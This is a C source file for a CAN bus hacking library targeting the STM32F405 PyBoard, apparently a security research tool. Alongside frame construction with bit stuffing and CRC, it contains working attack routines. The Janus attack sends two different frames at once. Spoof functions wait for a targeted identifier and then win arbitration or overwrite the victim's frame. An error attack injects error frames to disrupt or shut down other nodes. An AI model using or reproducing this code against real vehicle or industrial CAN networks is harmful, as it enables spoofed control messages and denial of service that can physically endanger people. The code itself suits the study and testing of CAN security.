//
//

// CAN hacking library. Targeted at the STM32F405-based PyBoard but should run on anything fast enough
// with a pair of I/O pins.
//
// The library
//
// The Janus Attack sets the bit pattern as follows:
//
// ^_____AAAAABBBBB^__...
// <--a-><-b->
// The first phase is to force a sync, the second phase is bit value A, the third phase is bit value B.
// The wrapper generates two bitstreams. The frame attack can be done provided the devices receiving
// the shorter frame cannot assert an SOF. This can be done by:
//
// 1. Ensuring there is no shorter frame (by mutating the payload until the number of stuff bits is the same)
// 2. Ensuring that traffic is not due yet from the devices that receive the shorter frame.
// 3. Ensuring that the devices that would generate traffic are in error passive mode.

#include "canhack.h"
#include CANHACK_BOARD_H
#include <stdio.h>

struct canhack;

// This is the CAN frame bit pattern that will be transmitted after observing 11 idle bits
struct canhack {
    canhack_frame_t can_frame1;                 // CAN frame shared with API
    canhack_frame_t can_frame2;                 // CAN frame shared with API

    // Status
    bool sent;                                  // Indicates if frame sent or not

    // CAN baud rate
    struct {
        uint32_t sample_point_offset;
        uint32_t bit_time;
        uint32_t sample_point_to_bit_end;       // Equal to bit_time - sample_point
    } can_baud;

    struct {
        uint64_t bitstream_mask;
        uint64_t bitstream_match;
        uint32_t n_frame_match_bits;
        uint32_t n_frame_match_bits_cntdn;
        uint32_t attack_cntdn;
        uint32_t dominant_bit_cntdn;
    } attack_parameters;
};

struct canhack canhack;

// Returns true if should re-enter arbitration due to lost arbitration and/or error.
static inline bool send_bits(uint32_t bit_end, uint32_t sample_point, uint32_t bit_time, struct canhack *canhack_p, uint8_t tx_index, uint32_t timeout, canhack_frame_t *frame)
{
    uint32_t now;
    uint32_t rx;
    canbit_t tx = frame->tx_bitstream[tx_index++];
    canbit_t cur_tx = tx;

    for (;;) {
        now = GET_CPU_CLOCK();
        // Bit end is scanned first because it needs to execute as close to the time as possible
        if (now >= bit_end) {
            SET_CAN_TX(tx);
            // The next bit is set up after the time because the critical I/O operation has taken place now
            cur_tx = tx;
            tx = frame->tx_bitstream[tx_index++];

            if ((tx_index >= frame->tx_bits) || (--timeout == 0)) {
                // Finished
                SET_CAN_TX(CAN_TX_REC());
                canhack_p->sent = timeout > 0;
                return false;
            }
            bit_end += bit_time;
        }
        if (now >= sample_point) {
            rx = GET_CAN_RX_BIT();
            if (rx != CAN_TX_BIT(cur_tx)) {
                // If arbitration then lost, or an error, then give up and go back to SOF
                SET_CAN_TX(CAN_TX_REC());
                return true;
            }
            sample_point += bit_time;
        }
    }
}

// Sends a sequence of bits, returns true if lost arbitration or an error
static inline bool send_janus_bits(uint32_t bit_end, uint32_t sync_end, uint32_t split_end, uint32_t bit_time, struct canhack *canhack_p, uint8_t tx_index)
{
    uint32_t now;
    uint32_t rx;
    canbit_t tx1 = 0;
    canbit_t tx2 = 0;
    uint8_t tx_bits = canhack_p->can_frame1.tx_bits > canhack_p->can_frame2.tx_bits ? canhack_p->can_frame1.tx_bits : canhack_p->can_frame2.tx_bits;

    for (;;) {
        for (;;) {
            now = GET_CPU_CLOCK();
            // Bit end is scanned first because it needs to execute as close to the time as possible
            if (now >= bit_end) {
                // Set a dominant state to force a sync (if previous sample was a 1) in all the CAN controllers
                SET_CAN_TX(CAN_TX_DOM());
                // The next bit is set up after the time because the critical I/O operation has taken place now
                tx1 = canhack_p->can_frame1.tx_bitstream[tx_index];
                bit_end += bit_time;
                break;
            }
        }
        for (;;) {
            now = GET_CPU_CLOCK();
            if (now >= sync_end) {
                SET_CAN_TX(tx1);
                tx2 = canhack_p->can_frame2.tx_bitstream[tx_index];
                tx_index++;
                if (tx_index >= tx_bits) {
                    // Finished
                    SET_CAN_TX(CAN_TX_REC());
                    canhack_p->sent = true;
                    return false;
                }
                sync_end += bit_time;
                break;
            }
        }
        for (;;) {
            now = GET_CPU_CLOCK();
            if (now >= split_end) {
                rx = GET_CAN_RX_BIT();
                SET_CAN_TX(tx2);
                split_end += bit_time;
                if (rx != CAN_TX_BIT(tx1)) {
                    SET_CAN_TX(CAN_TX_REC());
                    return false;
                }
                break;
            }
        }
    }
}

// Sends frame 1, returns true if sent (false if a timeout or too many retries)
bool canhack_send_frame(uint32_t timeout, uint32_t retries)
{
    uint32_t prev_rx = 0;
    struct canhack *canhack_p = &canhack;
    uint32_t sample_point_offset = canhack_p->can_baud.sample_point_offset;
    uint32_t bit_time = canhack_p->can_baud.bit_time;
    uint32_t bitstream = 0;
    uint8_t tx_index;

    RESET_CPU_CLOCK();
    // Look for 11 recessive bits or 10 recessive bits and a dominant
    uint32_t rx;
    uint32_t now = GET_CPU_CLOCK();;
    uint32_t sample_point = now + sample_point_offset;

SOF:
    for (;;) {
        rx = GET_CAN_RX_BIT();
        now = GET_CPU_CLOCK();

        if (prev_rx && !rx) {
            sample_point = now + sample_point_offset;
        }
        if (now > sample_point) {
            if (--timeout == 0) {
                SET_CAN_TX(CAN_TX_REC());
                return false;
            }
            bitstream = (bitstream << 1U) | rx;
            uint32_t bit_end = sample_point + canhack_p->can_baud.sample_point_to_bit_end;
            sample_point += bit_time;
            if ((bitstream & 0x7feU) == 0x7feU) {
                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                tx_index = rx ^ 1U;
                if (send_bits(bit_end, sample_point, bit_time, canhack_p, tx_index, timeout, &canhack_p->can_frame1)) {
                    if (retries--) {
                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                        goto SOF;
                    }
                    return false;
                }
                return canhack_p->sent;
            }
        }
        prev_rx = rx;
    }
}

// This sends a Janus frame, with sync_end being the relative time from the start of a bit when
// the value for the first bit value is asserted, and first_end is the time relative from the start
// of a bit when the second bit value is asserted.
bool canhack_send_janus_frame(uint32_t timeout, uint32_t sync_time, uint32_t split_time, uint32_t retries)
{
    uint32_t prev_rx = 0;
    struct canhack *canhack_p = &canhack;
    uint32_t sample_point_offset = canhack_p->can_baud.sample_point_offset;
    uint32_t bit_time = canhack_p->can_baud.bit_time;
    uint32_t bitstream = 0;
    uint8_t tx_index;

    RESET_CPU_CLOCK();
    // Look for 11 recessive bits or 10 recessive bits and a dominant
    uint32_t rx;
    uint32_t now = GET_CPU_CLOCK();;
    uint32_t sample_point = now + sample_point_offset;

SOF:
    for (;;) {
        rx = GET_CAN_RX_BIT();
        now = GET_CPU_CLOCK();

        if (prev_rx && !rx) {
            sample_point = now + sample_point_offset;
        }
        if (now > sample_point) {
            if (--timeout == 0) {
                SET_CAN_TX(CAN_TX_REC());
                return false;
            }
            bitstream = (bitstream << 1U) | rx;
            uint32_t bit_end = sample_point + canhack_p->can_baud.sample_point_to_bit_end;
            sample_point += bit_time;
            if ((bitstream & 0x7feU) == 0x7feU) {
                sync_time += bit_end;
                split_time += bit_end;
                // 11 bits, either 10 recessive and dominant = SOF, or 11 recessive
                // If the last bit was recessive then start index at 0, else start it at 1 to skip SOF
                tx_index = rx ^ 1U;
                if (send_janus_bits(bit_end, sync_time, split_time, bit_time, canhack_p, tx_index)) {
                    if (retries--) {
                        bitstream = 0; // Make sure we wait until EOF+IFS to trigger next attempt
                        goto SOF;
                    }
                    return false;
                }
                else {
                    return canhack_p->sent;
                }
            }
        }
        prev_rx = rx;
    }
}

#ifdef NOTDEF
// Print 64-bit shift value; used for debugging/testing shift registers
static void print_uint64(uint64_t n)
{
    for (uint32_t i = 0; i < 64U; i++) {
        if (1ULL << (63U - i) & n) {
            printf("1");
        }
        else {
            printf("0");
        }
    }
    printf("\n");
}
#endif

// Wait for a targeted frame and then transmit the spoof frame after winning arbitration next
bool canhack_spoof_frame(uint32_t timeout, bool janus, uint32_t sync_time, uint32_t split_time, uint32_t retries)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint32_t sample_point_offset = canhack_p->can_baud.sample_point_offset;
    uint32_t bit_time = canhack_p->can_baud.bit_time;
    uint64_t bitstream = 0;
    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;

    RESET_CPU_CLOCK();
    uint32_t rx;
    uint32_t now = GET_CPU_CLOCK();;
    uint32_t sample_point = now + sample_point_offset;

    for (;;) {
        rx = GET_CAN_RX_BIT();
        now = GET_CPU_CLOCK();

        // This in effect is the bus integration phase of CAN
        if ((prev_rx == 1U) && (rx == 0)) {
            // Falling edge is a sync point
            sample_point = now + sample_point_offset;
        }
        if (now > sample_point) {
            if (--timeout == 0) {
                SET_CAN_TX(CAN_TX_REC());
                return false;
            }
            sample_point += bit_time;
            bitstream = (bitstream << 1U) | rx;
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream & bitstream_mask) == bitstream_match) {
                if (janus) {
                    return canhack_send_janus_frame(timeout, sync_time, split_time, retries);
                }
                else {
                    return canhack_send_frame(timeout, retries);
                }
            }
        }
        prev_rx = rx;
    }
 }

// Wait for a targeted frame and then transmit the spoof frame over the top of the targeted frame
bool canhack_spoof_frame_error_passive(uint32_t timeout)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint32_t sample_point_offset = canhack_p->can_baud.sample_point_offset;
    uint32_t bit_time = canhack_p->can_baud.bit_time;
    uint64_t bitstream = 0;
    uint64_t bitstream_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream_match = canhack_p->attack_parameters.bitstream_match;

    RESET_CPU_CLOCK();
    uint32_t rx;
    uint32_t now = GET_CPU_CLOCK();;
    uint32_t sample_point = now + sample_point_offset;

    for (;;) {
        rx = GET_CAN_RX_BIT();
        now = GET_CPU_CLOCK();

        if (prev_rx && !rx) {
            sample_point = now + sample_point_offset;
        }
        else if (now > sample_point) {
            if (--timeout == 0) {
                SET_CAN_TX(CAN_TX_REC());
                return false;
            }
            uint32_t bit_end = sample_point + canhack_p->can_baud.sample_point_to_bit_end;
            sample_point += bit_time;
            bitstream = (bitstream << 1U) | rx;
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream & bitstream_mask) == bitstream_match) {
                send_bits(bit_end, sample_point, bit_time, canhack_p, canhack_p->attack_parameters.n_frame_match_bits, timeout, &canhack.can_frame1);
                return canhack_p->sent;
            }
        }
        prev_rx = rx;
    }
}

bool canhack_error_attack(uint32_t timeout, uint32_t repeat, bool inject_error, uint32_t eof_mask, uint32_t eof_match)
{
    uint32_t prev_rx = 1U;
    struct canhack *canhack_p = &canhack;
    uint32_t sample_point_offset = canhack_p->can_baud.sample_point_offset;
    uint32_t bit_time = canhack_p->can_baud.bit_time;
    uint64_t bitstream64 = 0;
    uint64_t bitstream64_mask = canhack_p->attack_parameters.bitstream_mask;
    uint64_t bitstream64_match = canhack_p->attack_parameters.bitstream_match;

    RESET_CPU_CLOCK();
    uint32_t rx;
    uint32_t now = GET_CPU_CLOCK();;
    uint32_t sample_point = now + sample_point_offset;
    uint32_t bit_end;

    for (;;) {
        rx = GET_CAN_RX_BIT();
        now = GET_CPU_CLOCK();

        if (prev_rx && !rx) {
            sample_point = now + sample_point_offset;
        }
        else if (now > sample_point) {
            bitstream64 = (bitstream64 << 1U) | rx;
            bit_end = sample_point + canhack_p->can_baud.sample_point_to_bit_end;
            sample_point += bit_time;
            // Search for 10 recessive bits and a dominant bit = SOF plus the rest of the identifier, all in one test
            if ((bitstream64 & bitstream64_mask) == bitstream64_match) {
                break;
                // Now want to inject an (optional) error frame
            }
            if (--timeout == 0) {
                return false;
            }
        }
        prev_rx = rx;
    }

    // bit_end is in the future, sample_point is after bit_end
    assert(now < bit_end);
    assert(bit_end < sample_point);

    // Inject an error frame
    if (inject_error) {
        for (;;) {
            now = GET_CPU_CLOCK();
            if (now >= bit_end) {
                SET_CAN_TX(CAN_TX_DOM());
                break;
            }
        }
        bit_end += bit_time * 6U;
        sample_point += bit_time * 6U;
        for (;;) {
            now = GET_CPU_CLOCK();
            if (now >= bit_end) {
                SET_CAN_TX(CAN_TX_REC());
                break;
            }
        }
    }

    // Sample point is in the future and will be scanned next; syncing is done because we are scanning through the frame (if there is no error)
    assert(now < sample_point);

    // Now wait for error delimiter / IFS point to inject a bit one or more times
    uint32_t bitstream32 = 0;

    for (uint32_t i = 0; i < repeat; i++) {
        for (;;) {
            rx = GET_CAN_RX_BIT();
            now = GET_CPU_CLOCK();

            if (now > sample_point) {
                bitstream32 = (bitstream32 << 1U) | rx;
                bit_end = sample_point + canhack_p->can_baud.sample_point_to_bit_end;
                sample_point += bit_time;
                if ((bitstream32 & eof_mask) == eof_match) {
                    // Inject six dominant bits to ensure an error frame is handled (in case all other devices are
                    // error passive and do not signal active error frames)
                    for (;;) {
                        now = GET_CPU_CLOCK();
                        if (now >= bit_end) {
                            SET_CAN_TX(CAN_TX_DOM());
                            bit_end += bit_time * 7U;
                            sample_point += bit_time * 7U;
                            bitstream32 = bitstream32 << 7U; // Pseudo-sample of own dominant bits
                            break;
                        }
                    }
                    for (;;) {
                        now = GET_CPU_CLOCK();
                        if (now >= bit_end) {
                            SET_CAN_TX(CAN_TX_REC());
                            break;
                        }
                    }
                    break;
                }
            }
        }
    }
    return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// CAN frame creator.
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////
static void add_raw_bit(canbit_t bit, bool stuff, canhack_frame_t *frame)
{
    // Record the status of the stuff bit for display purposes
    frame->stuff_bit[frame->tx_bits] = stuff;
    frame->tx_bitstream[frame->tx_bits++] = bit;
}

static void do_crc(canbit_t bit, canhack_frame_t *frame)
{
    uint32_t bitval = IS_CAN_TX_REC(bit) ? 1U : 0;

    uint32_t bit_14 = (frame->crc_rg & (1U << 14U)) >> 14U;
    uint32_t crc_nxt = bitval ^ bit_14;
    frame->crc_rg <<= 1U;
    frame->crc_rg &= 0x7fffU;
    if (crc_nxt) {
        frame->crc_rg ^= 0x4599U;
    }
}

static void add_bit(canbit_t bit, canhack_frame_t *frame)
{
    if (frame->crcing) {
        do_crc(bit, frame);
    }
    add_raw_bit(bit, false, frame);
    if (IS_CAN_TX_REC(bit)) {
        frame->recessive_bits++;
        frame->dominant_bits = 0;
    } else {
        frame->dominant_bits++;
        frame->recessive_bits = 0;
    }
    if (frame->stuffing) {
        if (frame->dominant_bits >= 5U) {
            add_raw_bit(CAN_TX_REC(), true, frame);
            frame->dominant_bits = 0;
            frame->recessive_bits = 1U;
        }
        if (frame->recessive_bits >= 5U) {
            add_raw_bit(CAN_TX_DOM(), true, frame);
            frame->dominant_bits = 1U;
            frame->recessive_bits = 0;
        }
    }
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//
// API to module
//
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_t dlc, const uint8_t *data, canhack_frame_t *frame)
{
    uint8_t len = rtr ? 0 : (dlc >= 8U ? 8U : dlc); // RTR frames have a DLC of any value but no data field

    frame->tx_bits = 0;
    frame->crc_rg = 0;
    frame->stuffing = true;
    frame->crcing = true;
    frame->dominant_bits = 0;
    frame->recessive_bits = 0;

    for (uint32_t i = 0; i < CANHACK_MAX_BITS; i++) {
        frame->tx_bitstream[i] = CAN_TX_REC();
    }

    // ID field is:
    // {SOF, ID A, RTR, IDE = 0, r0} [Standard]
    // {SOF, ID A, SRR = 1, IDE = 1, ID B, RTR, r1, r0) [Extended]

    // SOF
    add_bit(CAN_TX_DOM(), frame);

    // ID A
    id_a <<= 21U;
    for (uint32_t i = 0; i < 11U; i++) {
        if (id_a & 0x80000000U) {
            add_bit(CAN_TX_REC(), frame);
        }
        else {
            add_bit(CAN_TX_DOM(), frame);
        }
        id_a <<= 1U;
    }

    // RTR/SRR
    if (rtr || ide) {
        add_bit(CAN_TX_REC(), frame);
    }
    else {
        add_bit(CAN_TX_DOM(), frame);
    }

    // The last bit of the arbitration field is the RTR bit if a basic frame; this might be overwritten if IDE = 1
    frame->last_arbitration_bit = frame->tx_bits - 1U;

    // IDE
    if (ide) {
        add_bit(CAN_TX_REC(), frame);
    }
    else {
        add_bit(CAN_TX_DOM(), frame);
    }

    if (ide) {
        // ID B
        id_b <<= 14U;
        for (uint32_t i = 0; i < 18U; i++) {
            if (id_b & 0x80000000U) {
                add_bit(CAN_TX_REC(), frame);
            } else {
                add_bit(CAN_TX_DOM(), frame);
            }
            id_b <<= 1U;
        }
        // RTR
        if (rtr) {
            add_bit(CAN_TX_REC(), frame);
        }
        else {
            add_bit(CAN_TX_DOM(), frame);
        }
        // The RTR bit is the last bit in the arbitration field if an extended frame
        frame->last_arbitration_bit = frame->tx_bits - 1U;

        // r1
        add_bit(CAN_TX_DOM(), frame);
    }
    else {
        // If IDE = 0 then the last arbitration field bit is the RTR
    }
    // r0
    add_bit(CAN_TX_DOM(), frame);

    // DLC
    dlc <<= 28U;
    for (uint32_t i = 0; i < 4U; i++) {
        if (dlc & 0x80000000U) {
            add_bit(CAN_TX_REC(), frame);
        } else {
            add_bit(CAN_TX_DOM(), frame);
        }
        dlc <<= 1U;
    }
    frame->last_dlc_bit = frame->tx_bits - 1U;

    // Data
    for (uint32_t i = 0; i < len; i ++) {
        uint8_t byte = data[i];
        for (uint32_t j = 0; j < 8; j++) {
            if (byte & 0x80U) {
                add_bit(CAN_TX_REC(), frame);
            }
            else {
                add_bit(CAN_TX_DOM(), frame);
            }
            byte <<= 1U;
        }
    }
    // If the length is 0 then the last data bit is equal to the last DLC bit
    frame->last_data_bit = frame->tx_bits - 1U;

    // CRC
    frame->crcing = false;
    uint32_t crc_rg = frame->crc_rg << 17U;
    for (uint32_t i = 0; i < 15U; i++) {
        if (crc_rg & 0x80000000U) {
            add_bit(CAN_TX_REC(), frame);
        } else {
            add_bit(CAN_TX_DOM(), frame);
        }
        crc_rg <<= 1U;
    }
    frame->last_crc_bit = frame->tx_bits - 1U;

    // Bit stuffing is disabled at the end of the CRC field
    frame->stuffing = false;

    // CRC delimiter
    add_bit(CAN_TX_REC(), frame);

    // ACK; we transmit this as a dominant bit to ensure the state machines lock on to the right
    // EOF field; it's mostly moot since if there are no CAN controllers then there is not much
    // hacking to do.
    add_bit(CAN_TX_DOM(), frame);

    // ACK delimiter
    add_bit(CAN_TX_REC(), frame);

    // EOF
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);
    frame->last_eof_bit = frame->tx_bits - 1U;

    // IFS
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);
    add_bit(CAN_TX_REC(), frame);

    // Set up the matching masks for this CAN frame
    frame->tx_arbitration_bits = frame->last_arbitration_bit + 1U;

    frame->frame_set = true;
}

canhack_frame_t *canhack_get_frame(bool second)
{
    return second ? &canhack.can_frame2 : &canhack.can_frame1;
}

// Sets the CAN hack masks from frame 1 (frame 2 is only used in the Janus attack)
void canhack_set_attack_masks(void)
{
    canhack.attack_parameters.n_frame_match_bits = canhack.can_frame1.last_arbitration_bit + 1U;
    canhack.attack_parameters.bitstream_mask = (1ULL << (canhack.attack_parameters.n_frame_match_bits + 10U)) - 1ULL;
    canhack.attack_parameters.bitstream_match = 0x3ffULL;
    for (uint32_t i = 0; i < canhack.attack_parameters.n_frame_match_bits; i++) {
        canhack.attack_parameters.bitstream_match <<= 1U; // Shift a 0 in
        canhack.attack_parameters.bitstream_match |= CAN_TX_BIT(canhack.can_frame1.tx_bitstream[i]); // OR in the bit (first bit is SOF)
    }
}

void canhack_init(uint32_t bit_time, uint32_t sample_point_offset)
{
    canhack.can_baud.bit_time = bit_time;
    canhack.can_baud.sample_point_offset = sample_point_offset;
    canhack.can_baud.sample_point_to_bit_end = bit_time - sample_point_offset;
    canhack.can_frame1.frame_set = false;
    canhack.can_frame2.frame_set = false;
}
